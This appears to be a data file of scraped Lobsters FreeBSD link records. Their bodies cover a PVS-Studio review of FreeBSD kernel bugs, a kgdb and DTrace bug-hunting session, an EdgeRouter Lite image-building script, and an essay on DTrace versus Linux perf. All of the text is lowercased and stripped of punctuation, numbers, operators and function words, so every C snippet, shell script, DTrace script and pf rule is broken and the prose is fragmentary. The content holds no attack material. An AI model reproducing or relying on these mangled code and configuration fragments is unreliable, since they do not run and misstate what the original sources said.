piorequestcontext ossaiosuccess payloadsize framehandle else direct mode call back success ossasmpcompletedcbt prequest completioncb agroot prequest piorequestcontext ossaiosuccess payloadsize framehandle two condition branch commented differently indirect mode direct mode implemented similarly suspicious statement equivalent else statement smsatc osglobal void onedevicedata satdevicetype sataatadevice pinquiry lba low pinquiry lba mid pinquiry lba high pinquiry device pinquiry lba low exp pinquiry lba mid exp pinquiry lba high exp pinquiry reserved pinquiry sector count pinquiry sector count exp else pinquiry lba low pinquiry lba mid pinquiry lba high pinquiry device pinquiry lba low exp pinquiry lba mid exp pinquiry lba high exp pinquiry reserved pinquiry sector count pinquiry sector count exp example even suspicious previous one big code fragment copied later change made expression always true probably operator used qlahwc static int qlatxtso qlahostt ha struct mbuf mp tcpopt tcpopt tcpopt tcpopt return analyzer detected condition tcpopt tcpopt always true really build truth table likely needed typo address offset perhaps function code like static int qlatxtso qlahostt ha struct mbuf mp tcpopt tcpopt tcpopt tcpopt return recurring check condition already verified line sahwc global sihdamodev saroot memoryallocatedagmemory totallength biggest biggest saroot memoryallocatedagmemory totallength save biggest saroot memoryallocatedagmemory totallength code really strange simplify see following b b condition checked twice likely something else supposed written similar fragment recurring check condition already verified line ifrlc dangerous macro statement equivalent else statement agtiapic ostistrncmp buffer maxtargets ostistrtoul buffer plastusedchar agtiapiprintk maxtargets ostistrtoul n else maxtargets ostistrtoul buffer plastusedchar agtiapiprintk maxtargets ostistrtoul first skipped analyzer warning thinking false positive warning low severity also reviewed project check improve analyzer came across macro define ostistrtoul nptr endptr base strtoul char nptr char endptr base parameter nt used value always passed strtoul function last parameter although value passed macro preprocessed file macro got expanded code became similar macro used way several dozen time entire list fragment sent developer possible macro expansion resulted incorrect evaluation order check expression chan ispc static void ispsoftct isp isp chan else chan first glance nothing strange code fragment see sometimes chan value used sometimes le one chan let look macro definition define define chan sizeof chan passing binary expression macro calculation logic change dramatically expression chan turn chan ie chan incorrectly calculated size get used program priority operation section discus important know priority operation use extra parenthesis sure sometimes test building truth table logical expression perhaps operator work different way expected operator lower priority operator ataserverworksc ataserverworkschipinit devicet dev pciwriteconfig dev pcireadconfig dev ctlr chip priority operator lower bitwise result bit operation addition numeric constant expression result ctlr chip get used suddenly change calculationcomputation logic perhaps error nt noticed far result seemed close truth perhaps operator work different way expected operator lower priority operator void struct ifaddr ifa error rtinit ia iaifa rtmdelete ia iaflags ia rtfhost different file also fragment similar error ternary operator expression cdb cdb always true probably operator used mfitboltc int mfitboltsendframe struct mfisoftc sc struct mficommand cm cdb cdb reqdesc mfitboltbuildmptcmd sc cm null deviceprintf sc mfidev mapping mfi mpt failed n return else deviceprintf sc mfidev dja na xxx syspdion first conditional expression always true else branch never get control provide truth table case controversial logical expression following example example case consider inspecting error error expression expression excessive contains misprint int use send socket error sendsendsoinputhook ifp sndout app send socket error error return error problem fragment conditional expression nt depend result error perhaps something wrong three case consider inspecting error error expression expression excessive contains misprint ifipwc consider inspecting error error expression expression excessive contains misprint ifvmxc expression always true probably operator used igmpc consider inspecting expression expression excessive contains misprint sigverifyc enum uniieact uniieactclear clear call void unimandateepref struct uni uni struct uniieepref epref maxact foreacherr e uni e ie uniieepref continue e act uniieactclear maxact uniieactclear else e act uniieactmsgreport maxact maxact uniieactclear maxact uniieactmsgreport else e act uniieactmsgignore maxact maxact uniieactmsgignore result whole conditional expression r depend calculation value maxact uniieactclear look table section give three way make error seemingly simple formula think consider reviewing expression b c kind expression calculated following b c aacraidc define einval invalid argument define efault bad address define eperm operation permitted static int aacioctlsendrawsrb struct aacsoftc sc caddrt arg int error transferdata error copyin void usersrb datalen fibsize sizeof goto fibsize sc aacmaxfibsizesizeof error einval goto error copyin void usersrb srbcmd fibsize goto return error function error code get corrupted assignment executed operator ie expression error copyin copyin evaluated first result written variable error documentation function copyin state case error return efault value check result logical operation get stored error code actually eperm completely different error status unfortunately quite number fragment consider reviewing expression b c kind expression calculated following b c aacraidc consider reviewing expression b c kind expression calculated following b c ifagec consider reviewing expression b c kind expression calculated following b c ifalcc consider reviewing expression b c kind expression calculated following b c ifalec consider reviewing expression b c kind expression calculated following b c ifjmec consider reviewing expression b c kind expression calculated following b c ifmskc consider reviewing expression b c kind expression calculated following b c ifstgec consider reviewing expression b c kind expression calculated following b c huntfilterc consider reviewing expression b c kind expression calculated following b c ifsmscc consider reviewing expression b c kind expression calculated following b c ifvtec consider reviewing expression b c kind expression calculated following b c zfsvfsopsc string dangerous print string buffer atahighpointc static int atahighpointprobe devicet dev char buffer strcpy buffer highpoint strcat buffer idx text idx pcigetfunction dev strcat buffer channel pcigetfunction dev strcat buffer channel sprintf buffer controller buffer idx maxdma string formed buffer programmer want get new string saving previous string value add two word seems really simple explain unexpected result recieved quote simple clear example documentation diagnostic char test sprintf n result work would want get following string n test practice like n n situation code lead incorrect text also program abortion code fixed use new buffer store result correct version char test char sprintf n call strcpy function lead overflow buffer p vendor aacraidcamc define sidvendorsize char vendor sidvendorsize define sidproductsize char product sidproductsize define sidrevisionsize char revision sidrevisionsize static void aaccontainerspecialcommand struct camsim sim union ccb ccb cmdp oem vendor defines strcpy p vendor adaptec strcpy p product array strcpy p revision three string filled incorrectly space nullterminal symbol array may cause serious problem string future one space removed p vendor p product room null terminal strcpy function add end string free space end line character p revision value sidrevisionsize increased least one course rather hard judge code possible terminal null needed everything designed specific buffer size strcpy function chosen incorrectly case code written like memcpy p vendor adaptec sidvendorsize memcpy p product array sidproductsize memcpy p revision sidrevisionsize operator regardless conditional expression always return one value td tdname subrturnstilec static void printthread struct thread td const char prefix dbprintf p tid pid prefix td td tdtid td tdproc ppid td tdname td tdname td tdname suspicious fragment despite td tdname check string still printed fragment operator regardless conditional expression always return one value td tdname subrturnstilec operator regardless conditional expression always return one value td tdname subrturnstilec operation memory section tell incorrect usage following function void bzero void b sizet len int copyout const void kaddr void uaddr sizet len bzero function receives pointer size argument possibly mistake inspect second argument osapic autosense storage struct scsisensedata sensedata void ostiinitiatoriocompleted bzero csio sensedata sizeof csio sensedata zero structure pas structure pointer size memory zeroed byte bzero function pointer size passed function structure size correct code like bzero csio sensedata sizeof csio sensedata bzero function receives pointer size argument possibly mistake inspect second argument acpipackagec int acpipkgstr void dst bzero dst sizeof dst example see similar situation size pointer object get passed bzero function correct version bzero dst sizeof dst copyout function receives pointer size argument possibly mistake inspect third argument ifnxgec int xgeioctlstats xgelldevt lldev struct ifreq ifreqp data data n copyout data ifreqp ifrdata sizeof data retvalue break example memory copied data ifreqp ifrdata time size memory copied sizeof data ie byte depending bitness architecture pointer array overrun possible index pointing beyond array bound ifspppsubrc define authkeylen struct sauth ushort proto authentication protocol use ushort flag define authflagnocallout callouts define authflagnorechallenge rechallenge chap uchar name authnamelen system identification name uchar secret authkeylen secret password uchar challenge authkeylen random challenge static void spppchapscr struct sppp sp ulong ch seed uchar clen compute random challenge ch ulong sp myauthchallenge readrandom seed sizeof seed ch seed random ch seed random ch seed random ch seed random clen authkeylen size uchar type byte bit application size ulong type byte application byte application application execution operation ulong ch ulong sp myauthchallenge array ch consist element byte application array ch consist element byte therefore compile kernel accessing ch ch array index bound nonsensical comparison pointer geomvinumplexc gvplexoffset int sdno int growing sdno stripeno sdcount kassert sdno gvplexoffset sdno managed detect interesting fragment help diagnostic point checking pointer greater equal likely pointer sdno dereferenced order compare stored value two comparison null nonsensical comparison pointer nonsensical comparison pointer dereferencing null pointer sc might take place mrsasc void mrsasaenhandler struct mrsassoftc sc sc deviceprintf sc mrsasdev invalid instance n return sc evtdetailmem pointer sc null one function exit however quite clear programmer tried dereference sc mrsasdev pointer list strange fragment dereferencing null pointer sc might take place mrsasc dereferencing null pointer sc might take place twscamc dereferencing null pointer sc might take place blkfrontc dereferencing null pointer devpriv might take place radeoncsc dereferencing null pointer ha might take place qlisrc pointer utilized logical expression verified nullptr logical expression ipfastfwdc struct mbuf iptryforward struct mbuf pfilrunhooks vinetpfilhook mpkthdrrcvif pfilin null null goto drop check null placed incorrectly first need check pointer call pfilrunhooks function loop consider inspecting operator possible loop executed incorrectly wo nt executed ifaec define aeidletimeout static void aestoprxmac aesoftct sc int wait idle state aeidletimeout val sc aeidlereg val aeidlerxmac aeidledmawrite break delay source code freebsd found interesting incorrect loop reason decrement loop counter instead increment turn loop execute time value aeidletimeout break operator executes loop stopped overflow signed variable signed variable overflow nothing undefined behavior abstract theoretical danger real recently colleague wrote article topic undefined behavior closer think one interesting moment detected error code haiku operating system see section warning idea borrowed ifaec file error appears copypaste variable used loop outer loop check line mfitboltc mfitboltadpreset struct mfisoftc sc probably small piece code used creating delay sum total operation executed loop needed specifically cited example vivid show usage variable external nested loop lead unexpected result variable used loop outer loop check line linuxvdsoc void elfn linuxvdsoreloc struct sysentvec sv long vdsoadjust ehdr eshnum shdr shflags shfalloc continue shdr shaddr vdsoadjust shdr shtype shtsymtab shdr shtype shtdynsym continue sym elfsym caddrt ehdr shdr shoffset symcnt shdr shsize sizeof sym symcnt sym sym stshndx shnundef sym stshndx shnabs continue sym stvalue vdsoadjust probably complicated example understand code executes correctly looking previous example draw conclusion wrong number iteration executed well expression j always true unsigned type value always safec static void safemcopy struct mbuf srcm struct mbuf dstm uint offset uint j dlen slen caddrt dptr sptr advance src dst offset j offset j srcm mlen j break j srcm mlen srcm srcm mnext srcm null return sptr mtod srcm caddrt j slen srcm mlen j j offset j dstm mlen j break j dstm mlen dstm dstm mnext dstm null return dptr mtod dstm caddrt j dlen dstm mlen j two dangerous loop function j variable loop counter unsigned type j check always true loop infinity another problem value constantly subtracted counter therefore attempt access beyond zero value j variable get maximum value type dangerous create local variable within loop name variable controlling loop powernowc static int pndecodepst devicet dev struct pstheader pst p psb sizeof struct psbheader pst struct pstheader p maxpst struct pstheader pst struct pstheader p p sizeof struct pstheader pst numpstates pst cpuid maxpst body loop detected variable declaration match variable used loop control suspect value external pointer pst name nt change local pointer pst created perhaps pst cupid value always checked loop condition developer review fragment give variable different name miscelleneous truncation constant value value range unsigned char type ifrsuc struct nf global nf rssi global rssi static void rsueventsurvey struct rsusoftc sc buf int len rxsrssi bs rssi rxsnf strange unsigned variable rxsnf assigned negative value result variable value function body contains done label used goto statement zfsaclc int zfssetacl znodet zp vsecattrt vsecp top mutexenter zp zacllock mutexenter zp zlock error erestart dmutxwait tx dmutxabort tx goto top done mutexexit zp zlock mutexexit zp zacllock return error code function containing label time call goto statement missing label example see top label used fragment done nt used anywhere perhaps programmer forgot add jump label removed time label left code consider inspecting application logic possible else keyword missing macprocessc static void macprocvmrevokerecurse struct thread td struct ucred cred struct vmmap map macmmaprevocationviacow vme maxprotection vmprotwrite vme protection vmprotwrite revokeperms vmprotread vme eflags mapentrycow mapentryneedscopy finally want tell suspicious formatting already came across beginning project check code aligned way absence keyword else look strange possible else block forgotten commented thus altering program operation logic scsidac static void dadone struct camperiph periph union ccb doneccb tried read capacity failed fallback read capacity state else attach anything claim direct access optical disk device long nt return logical unit supported error havesense asc else code error definitely show one day leaving big commentary else may accidentally forget keyword somewhere code make erroneous edits conclusion freebsd project tested special version pvsstudio showed great result whole material impossible fit one article nevertheless development team freebsd got full list analyzer warning examined suggest everyone try pvsstudio project analyzer work window environment nt public version using analyzer development project linuxfreebsd could also discus possible variant customization pvsstudio project specific task
566,Lobsters,freebsd,FreeBSD,Interested in BSD ports or are we all wasting time here?,https://github.com/dart-lang/sdk/issues/10260#issuecomment-174287146,interested bsd port wasting time,join github today sign,dismiss join github today github home million developer working together host review code manage project build software together sign
567,Lobsters,freebsd,FreeBSD,Example of a FreeBSD bug hunting session by a simple user,http://blog.cochard.me/2016/01/example-of-freebsd-bug-hunting-session.html,example freebsd bug hunting session simple user,problem description day facing bug day reducing setup complexity http http checking interface status simple user way checking kernel interface status developer way know index number interface display variable ifilinkstate wizzard code find variable ifindextable variable iflinkstate ifilinkstate like written ifnet time play live kernel debugging convert linkstate value human language http checking kernel interface status modern way http dtraceorgguideprefacehtml http wikifreebsdorgdtracetutorial,problem description meet problem one freebsdwirelessrouter freebsd network developer alexander v chernikov alias melifaro help identify culprit kernel function writedown tip learn teacher session day facing bug need bug starting day case updating configuration previously working wirelessrouter setup stop working correctly day reducing setup complexity wirelessrouter configuration complex involves routing wireless hostap mode ipfw snort bridge openvpn etc first step reproduce problem minimum step mean simplest configuration latest freebsd current developer work current rule getting help callforhelp message need short developer nt lot free time important clearly demonstrate nonattended behavior step reproduce easily twice post first callforhelp message still complex configuration http work simplify problem post new message day later http second message good one catch developer eye resume bug setup lan fbsd router lan wireless lan freebsd configured like one ip address call lan one ip address includes interface enabled put state configured hostap mode forwarding enabled setup forward wireless client host lan interface belong connected status ethernet nic connected status freebsd router consider client behind unreacheable even ping wireless client tcpdump output router dumping ping generated wireless client connected forwarded toward host lan root fbsdrouter tcpdump pni tcpdump verbose output suppressed use v vv full protocol decode listening linktype ethernet capture size byte arp request whohas tell length arp reply isat length ip icmp echo request id seq length ip icmp echo reply id seq length ip icmp host unreachable length ip icmp echo request id seq length ip icmp echo reply id seq length ip icmp host unreachable length ip icmp echo request id seq length ip icmp echo reply id seq length ip icmp host unreachable length c solving problem need plug ethernet interface changing status active checking interface status simple user way check check status interface root fbsdrouter ifconfig broadcast running simplex multicast metric mtu rxcsum txcsum vlanmtu vlanhwtagging vlanhwcsum wolmagic linkstate ether inet netmask broadcast performnud ifdisabled autolinklocal medium ethernet autoselect fullduplex master status active root fbsdrouter ifconfig broadcast running promisc simplex multicast metric mtu ether performnud ifdisabled autolinklocal medium ieee wireless ethernet autoselect mode hostap status running ssid tutu channel mhz bssid country u ecm authmode open privacy txpower scanvalid protmode ct ampdulimit ampdudensity shortgi wme burst dtimperiod dfs group wlan root fbsdrouter ifconfig broadcast running promisc simplex multicast metric mtu rxcsum vlanmtu vlanhwtagging vlanhwcsum wolmagic linkstate ether performnud ifdisabled autolinklocal medium ethernet autoselect none status carrier root fbsdrouter ifconfig broadcast running simplex multicast metric mtu ether de inet netmask broadcast performnud ifdisabled group bridge id priority hellotime fwddelay maxage holdcnt proto rstp maxaddr timeout root id priority ifcost port member learning discover autoedge autoptp ifmaxaddr port priority path cost member learning discover autoedge autoptp ifmaxaddr port priority path cost nothing seems wrong flag status active flag status running suppose okay wireless client paquets correctly enter interface even ping ip address flag status carrier cable connected flag display status suppose wireless client ping developer never suppose status interface speak strange language directly kernel asking real status checking kernel interface status developer way freebsd kernel manage network interface simple user let read huge man ifconfig nt found answer see also section mention man netintro introduction network comprehensive inside netintro man page skipped addressing routing section interface section nothing interface status see also section mention man ifnet let try trying resume man page kernel mechanism handling network interface reside primarily ifnet ifdata ifaddr ifmultiaddr structure netifh netifvarh function named defined sysnetifc system keep linked list interface using tailq macro defined queue list headed struct ifnethead called ifnet element list type struct ifnet structure additionally contains generic statistic applicable variety different interface type except noted member type ulong ifilinkstate uchar current link state ethernet interface see interface link state section possible value interface link state following link state currently defined linkstateunknown link invalid unknown state linkstatedown link linkstateup link wow reach limit understanding network interface index number assigned known index number read state variable ifilinkstate got new question know index number interface user used us netstat know link displayed root fbsdrouter netstat iww grep link tr cut f link link link link link link link number interface index number display variable ifilinkstate answer came melifaro use kernel debugger kgdb printing value variable called ifindextable index iflinkstate wizzard code find variable ifindextable use grep ifindextable usrsrcsysnet found ifindextable defined ifc table ifnet index reading source code mandatory discovering variable name variable iflinkstate ifilinkstate like written ifnet seems ifnet manual page uptodate time play live kernel debugging root fbsdrouter kgdb bootkernelkernel devmem gnu gdb freebsd copyright free software foundation inc kgdb print ifindextable iflinkstate kgdb p ifindextable iflinkstate kgdb p ifindextable iflinkstate kgdb p ifindextable iflinkstate great got value even print full structure command ptype kgdb ptype ifindextable type struct ifnet struct struct ifnet tqenext struct ifnet tqeprev iflink struct struct ifnet lenext struct ifnet leprev ifclones struct struct ifglist tqhfirst struct ifglist tqhlast ifgroups uchar ifalloctype void ifsoftc void ifllsoftc void const char ifdname int ifdunit ushort ifindex short ifindexreserved char ifxname char ifdescription int ifflags int ifdrvflags int ifcapabilities int ifcapenable void iflinkmib sizet iflinkmiblen uint ifrefcount iftype ifaddrlen ifhdrlen iflinkstate ifmtu ifmetric ifbaudrate ifhwassist funny useless current task convert linkstate value human language another grep linkstate usrsrcsysnet answer described ifh value iflinkstate define linkstateunknown link invalidunknown define linkstatedown link define linkstateup link translate kernel view interface index state index state index state unknown index state wait minute state ca nt correct interface working bridge logic seems wrong first interface state second unknow state bridge state let check plugging testing kernel view kgdb p ifindextable iflinkstate kgdb p ifindextable iflinkstate confirmed switch link state bridge switch link definitively bug bridge logic full detailed explanation http able simple user found exact index table name variable name debug could dtrace checking kernel interface status modern way dtrace guide http dtraceorgguideprefacehtml mention dtrace comprehensive dynamic tracing framework operating system dtrace provides powerful infrastructure permit administrator developer service personnel concisely answer arbitrary question behavior operating system user program service personnel able use first freebsd dtrace google answer http wikifreebsdorgdtracetutorial tutorial explains display available dtrace probe probe location activity dtrace bind request perform set action like recording stack trace timestamp argument function probe like programmable sensor scattered illumos system interesting place official guide link state problem start searching probe named linkstate linkstate root fbsdrouter dtrace l grep link state id provider module function name fbt kernel dolinkstatechange entry fbt kernel dolinkstatechange return fbt kernel vlanlinkstate entry fbt kernel iflinkstatechange entry fbt kernel iflinkstatechange return fbt kernel usbdreqsetportlinkstate entry fbt kernel usbdreqsetportlinkstate return fbt ifbridge bridgelinkstate entry fbt bridgestp bstplinkstate entry fbt bridgestp bstplinkstate return interesting result use read dtrace guide dtrace use programming language scripting action probe triggered example want display dtrace probe triggered time dtrace proble bridgelinkstate triggered use command dtrace f bridgelinkstate trace dtrace probe triggered example root fbsdrouter dtrace f bridgelinkstate trace dtrace probe triggered dtrace description bridgelinkstate matched probe plug interface switch cpu id function name bridgelinkstate entry dtrace probe triggered unplug interface bridgelinkstate entry dtrace probe triggered plugback bridgelinkstate entry dtrace probe triggered unplug interface bridgelinkstate entry drace probe triggered remove line play cable hour see probe idea variable value changed call information almost useless came melifaro brings full dtrace script added comment begin special probe triggered begining script purpose define table giving linkstate value description begin unknown defining action probe ifbridge bridgelinkstate entry triggered notice probe entry return entry return variable called need return code function return used fbt ifbridge bridgelinkstate entry need read sysnetifbridgec understanding dtrace function bridgelinkstate called ifnet structure pointer argument first step cast ifnet struct using mifp ca nt directly use mifp iflinkstate bridge interface ifnet struct includes specific software state bridge bridgesoftc struct ifbridge second step cast mifp ifbridge bridgesoftc struct sc first member bridgesoftc struc standard ifnet structure nammed ifp last cast ifnet struct self ifp get iflinkstate self ifp iflinkstate mifp struct ifnet sc struct bridgesoftc mifp ifbridge self ifp struct ifnet sc scifp defining action probe kernel dolinkstatechange triggered notice self ifp specific language nt include control flow like time probe triggered condition checked false code exectuted condition self ifp mean condition triggered variable set non null previous probe fbt kernel dolinkstatechange entry self ifp originaly stack trace displayed commented stack need read sysnetifc understanding dtrace function static void dolinkstatechange void arg int pending first argument ifnet structure second argument new state apply printf linkstate changed stringof self ifp ifxname self ifp iflinkstate reset triggering variable null self ifp null let try root fbsdrouter dtrace bridged dtrace script bridged matched probe plug cpu id function name dolinkstatechange entry linkstate changed unplug dolinkstatechange entry linkstate changed plug dolinkstatechange entry linkstate changed c great tool give live view real current interface status kernel point view using dtrace like kgbd read freebsd source man page outdated small easy troubleshooting kgbd lot easy faster choice late started read freebsd source code learned use dtrace small bug beware coming
568,Lobsters,freebsd,FreeBSD,FreeBSD on EdgeRouter Lite,http://www.daemonology.net/blog/2016-01-10-FreeBSD-EdgeRouter-Lite.html,freebsd edgerouter lite,freebsd edgerouter lite serial port required edgerouter lite installing freebsd onto edgerouter lite image building script view forum thread blog comment powered,freebsd edgerouter lite serial port required recently bought edgerouter lite use network gateway using cheap consumer wifinat device wanted extra control could get running freebsd rather whatever mangled version linux device came someone wrote instruction installing freebsd onto edgerouter lite two year ago rely using serial port reconfigure boot loader perfectly straightforward serial cable know decided take opportunity provide streamlined process required edgerouter lite small phillips plus screwdriver another system running freebsd step fetch freebsd head source tree freebsd supported yet think might change download image building script run buildimgsh pathtosrctree diskimg remove three small screw back edgerouter lite open case remove usb drive mine held firmly place found wiggling towards away board allowed gradually ease free plug usb disk system built freebsd image run dd ifdevusbdisk oferlimg usbdisk name usb disk device probably make backup edgerouter lite software case something break need restore later run dd ifdiskimg ofdevusbdisk usbdisk write freebsd disk image onto edgerouter lite usb disk plug usb disk back edgerouter lite close box replace three screw three gigabit ethernet port edgerouter lite marked case freebsd show order configuration image connected upstream internet connection system run dhcp connection get ip address sends internet traffic port connected lan system provides ip address within block via dhcp run recursive dns server also advertised via dhcp ntp server like except get ip address block traffic port port connect via ssh using username password ubnt recommend leaving port unused except need ssh reconfigure something pretty much need know install use freebsd edgerouter lite interesting trick involved script build disk image rest blog post provide brief walkthrough script binsh e shell script run binsh matter misguided linux user may think binbash standard shell e option tell shell interpreter exit command fail something go wrong stop let user see happened rather continuing producing broken disk image later z z echo buildimgsh srcdir diskimg exit fi srcdir imgfile script take two option location freebsd source tree name file use disk image set environment variable make use export targetmips export export kernconferl edgerouter lite mips system freebsd head kernel configuration already defined export allmodulesyes export withoutmodules cxgbe mwlfw otusfw ralfw usb rtwnfw unfortunately kernel configuration disables building kernel module want use pf later module fail build nt investigate exactly something related firmware blob turn explicitly create working space workdir env tmpdir pwd mktemp erlbuild create temporary working space current directory many system tmp nt large enough hold complete installation freebsd overrode default build world erl kernel jn sysctl n hwncpu cd srcdir make buildworld j jn cd srcdir make buildkernel j jn build world kernel j flag tell make run several command parallel consult sysctl find many cpu available build install temporary tree mkdir workdir tree cd srcdir make installworld distribution installkernel destdir workdir tree create tree install freebsd installworld installkernel target install userspace kernel binary respectively distribution target installs standard configuration file download package cp etcresolvconf workdir treeetc pkg c workdir tree install fy pkg djbdns rm workdir treeetcresolvconf freebsd project provides precompiled binary package mips architecture allows u put package image building avoiding headache crossbuilding however crossinstall package either since package run script installed script since building disk image system wo nt able run instead simply download package image installed system first boot freebsd configuration cat workdir treeetcrcconf eof etcrcconf file master configuration file freebsd enablingdisabling service done well specific configuration hostname erl every host need name call erl lacking better inspiration growfsenable yes building disk image write onto provided usb disk image smaller disk system first boot tell expand root partition fill available space tmpfs yes tmpsize probably unnecessary like memory disk mounted tmp reason temporary file get created avoid burning flash storage dhcp netmask netmask run dhcp upstream connection provide static network parameter lan connection pfenable yes gatewayenable yes going use pf firewall going forwarding packet via network address translation two lan port need option sendmailenable none sshdenable yes ntpdenable yes ntpdsynconstart yes svscanenable yes dhcpdenable yes dhcpdifaces eof nt want run sendmail want run sshd use pf restrict access however want run ntpd want set clock start matter far edgerouter lite nt batterypowered clock boot wildly wrong time set want run svscan launch dnscache u want run dhcp daemon two lan interface cat workdir treeetcpfconf eof allow anything loopback set skip scrub incoming traffic scrub nat outgoing traffic nat inet network network reject anything spoofed address antispoof quick inet default blocking incoming traffic allowing outgoing traffic block pas allow lan access rest world pas block self allow lan ping u pas inet proto icmp self icmptype echoreq allow lan access dns dhcp ntp pas proto udp self port pas proto tcp self port allow access ssh pas proto tcp self port eof fairly straightforward pf configuration nat outgoing traffic onto upstream connection allow local network access dns dhcp ntp allow access ssh opted allow icmp echo request packet lan side people prefer respond ping anywhere decided general purpose image better err direction silent similarly decided simply drop bad packet rather sending tcp rst icmp unreachable response mkdir p workdir treeusrlocaletc cat workdir treeusrlocaletcdhcpdconf eof option domainname localdomain subnet netmask range option router option domainnameservers subnet netmask range option router option domainnameservers eof provides basic configuration isc dhcpd feeling could simplified single configuration block covering lan port script complete setup running right hardware mkdir p workdir treeusrlocaletcrcd cat workdir treeusrlocaletcrcderl eof binsh mentioned earlier could nt crossinstall package take care script run first time freebsd boot quote around eof heredocument syntax instruct shell variable expanded important since creating shell script us several shell variable keyword firstboot firstboot keyword tell etcrc script run first time system boot provide erl require networking login script completes configuration edgerouter lite system included image enabled default etcrcsubr erlenable yes name erl rcvar erlenable startcmd erlrun stopcmd fairly standard rcd script boilerplate erlrun package env signaturetypenone pkg add f varcachepkgpkg txz pkg install uy djbdns want install two package downloaded image earlier dns setup pw user add dnscache u nonexistent usrsbinnologin pw user add dnslog u nonexistent usrsbinnologin mkdir varservice usrlocalbindnscacheconf dnscache dnslog varservicednscache touch configure dnscache launched svscan respond dns request lan create ubnt user echo ubnt pw user add ubnt g wheel h could created user creating disk image since needed firstboot script anyway easier h option mean read password standard input echoing need reboot service started touch firstbootsentinel reboot part rcd firstboot mechanism allow script ask system rebooted first boot associated system initialization complete case need reboot order svscan iscdhcpd running since nt installed yet boot process started loadrcconfig name runrccommand eof chmod workdir treeusrlocaletcrcderl boilerplate rcd script must executable want run firstboot script touch workdir treefirstboot sentinel file firstboot tell freebsd system booting first time firstboot script run end first boot etcrc deletes file create filesystem hold kernel newfsmsdos c f c workdir mddev mdconfig f workdir mkdir workdir mount msdosfs dev mddev workdir cp workdir treebootkernelkernel workdir umount dev mddev rmdir workdir mdconfig u mddev edgerouter lite boot loader expects launch linux kernel found within filesystem fortunately nt check kernel launching linux create filesystem drop freebsd kernel named edgerouter lite boot loader launch u kernel mb minimum size filesystem mb create ufs filesystem echo ufs rw workdir treeetcfstab makefs f b big workdir ufsimg workdir tree use makefs tool create ufs filesystem installed freebsd tree hardware bigendian ufs endianagnostic need tell makefs create bigendian filesystem also mean assuming using littleendian system build disk image ca nt mount filesystem system using create create complete disk image mkimg mbr p workdir p freebsd mkimg bsd p freebsdufs workdir ufsimg imgfile edgerouter lite boot loader expects kernel found first mbr slice freebsd erl kernel configuration expects root filesystem found better put clean chflags r noschg workdir rm r workdir finish building disk image nt need staging tree separate filesystem image view forum thread blog comment powered
569,Lobsters,freebsd,FreeBSD,Dtrace isn't just a tool; it's a philosophy,http://codearcana.com/posts/2016/01/03/dtrace-isnt-just-a-tool-its-a-philosophy.html,dtrace nt tool philosophy,post pain point going cpu calling brendan gregg file reading problem stack trace clear automatically inlined introspection linux linus bryan cantrill question driven methodology use method tsa method actively benchmarked,recent post story successful performance investigation unfortunately happy post intentionally simplified audience company blog reality frequently find performance investigation linux frustrating process due lack adequate tooling blog post document recent pain point speculate issue endemic linux pain point compare answer following question production linux freebsdsolaris going cpu freebsdsolaris dtrace n sched offcpu pid target self t timestamp sched oncpu self t stack ustack quantize timestamp self t self t p pid linux perf record g e sched schedswitch e sched schedstatsleep e sched schedstatblocked p pid post process perf inject line stackcollapseperfschedawk script unfortunately tracing scheduler event high overhead perf lack inkernel aggregation mean event probably dropped load high even alarmingly appear bug perf prevent reliably getting consistent trace even large trace buffer causing produce empty perfdata file error message form failed process type since failure deterministic reexecuting perf record eventually succeed however sometimes hard catch pathology calling malloc freebsdsolaris dtrace n pid target malloc entry ustack count p pid linux possible could write gdb script although scared production another alternative use uprobe interface perf probe malloc size di perf record e probelibc malloc g pid pid aside common message overhead kernel aggregate found interface particularly brittle even scarier brendan gregg also warns issue would make unsuitable production environment nt personally seen using perf yet frequently hit issue target process either crash enters endless spin loop file reading freebsdsolaris dtrace n syscall read entry fds fipathname sum p pid linux strace used traditional solution although high overhead perf trace eread p pid save data post process although must repeat message overhead kernel aggregate problem stack trace almost question form application x answered looking userspace stack trace unfortunately almost impossible linux distribution ubuntu compiles libc fomitframepointer gcc default stymy perfs ability walk stack go commonly used system library worse clear perf ubuntu properly support walking dwarf unwind information used callgraphdwarf moderately successfully appears lose frame compared stack gdb etc linux application omit frame pointer eschewing future visibility sake immediate microoptimization application choose compromise merely omitting frame pointer leaf function causing second last frame every stack omitted either aggressive function inlining cause resulting stack trace approximation logical stack trace stark contrast illumos kernel force frame pointer prohibits small function automatically inlined guarantee precise stack trace since convenient place add dynamic tracepoints via dtrace function call boundary also ensures plethora option ever become necessary debug new component introspection linux seems linux community support level kernelsystem introspection solaris think issue cultural technical take look famous quote linus eschews use kernel debugger nt think kernel development easy think extra visibility system necessarily good thing linux kernel complicated mysterious system intended fully understood author tool like kernel debugger necessary compare recent quote equally opinionated former solaris kernel engineer bryan cantrill important observability docker container nt reboot pc goddammnit debug come educated person right least want act like one around educated people talk bryan emphatically call bigger observability linux subsystem complicated problem production diagnosed fixed condemns engineering antipattern adding observability something gone wrong pointing put engineer position trying reproduce potentially transient issue flexible dynamic tracing tool power deeply introspect kernel like dtrace necessary observe debug issue production question driven methodology thing dtrace powerful flexible encourages question driven methodology rather tool driven methodology rather merely trying infer problem sar utility ask simple specific question root cause issue common tool iostat top sar etc useful mean prompt question rarely useful brendan gregg advocate use method tsa method providing framework converting sar metric useful question story illustrates point quite well couple year ago mock technical interview adam leventhal walked real performance investigation previously done interview described faulty server asked debug using magical oracle could answer question system course interview explained used dtrace answer every question put oracle looking beyound simple sar metric asking focused question able resolve hour issue would nigh impossible understand otherwise linux support dynamic tracing tool enable type investigation least recently remain second class citizen perf ftrace feel brittle limited compared deep visibility dtrace contrast dynamic tracing valuable solaris kernel built specifically dtrace mind high fidelity dynamic tracing production important approximated separate tool baked every layer system question driven methodology learned mentor solaris community proven challenging start working within linuxbased company slowly learning use perf answer question slowly changing culture current company highlight compile fnoomitframepointer increase fidelity cpu stack collected perf slowly cutting back amount unnecessary function inlining simple tool place detect eggregious example hook increase debuggability via recording jited symbol perf etc dynamically enabled run time adhoc investigation previously required server restart almost engineer company use flame graph performance investigation quickly answer first question cpu time spent become uncommon see performance regression bug filed without attached flame graph recent iteration performance test actively benchmarked flame graph written process caught corrected several test testing wrong path
